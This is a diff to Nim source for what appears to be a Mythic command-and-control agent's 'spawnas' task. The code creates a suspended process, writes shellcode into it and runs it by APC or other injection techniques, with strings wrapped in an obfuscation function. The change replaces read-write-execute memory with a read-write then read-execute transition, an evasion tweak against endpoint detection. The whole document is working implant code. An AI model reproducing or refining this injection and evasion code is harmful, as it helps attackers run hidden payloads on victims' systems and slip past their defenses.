@@ -146,7 +146,7 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
       
       # Inject shellcode into the suspended process
       let pRemote = VirtualAllocEx(pi.hProcess, nil, SIZE_T(shellcode.len),
-                                    MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+                                    MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
       if pRemote == nil:
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
@@ -160,6 +160,15 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
         return mythicError(taskId, obf("WriteProcessMemory failed: ") & $GetLastError())
+      
+      # Transition RW -> RX (no RWX pages)
+      var oldProtect: DWORD
+      if VirtualProtectEx(pi.hProcess, pRemote, SIZE_T(shellcode.len),
+                          PAGE_EXECUTE_READ, addr oldProtect) == 0:
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return mythicError(taskId, obf("VirtualProtectEx failed: ") & $GetLastError())
       
       case args.technique.toLower()
       of obf("apc"):
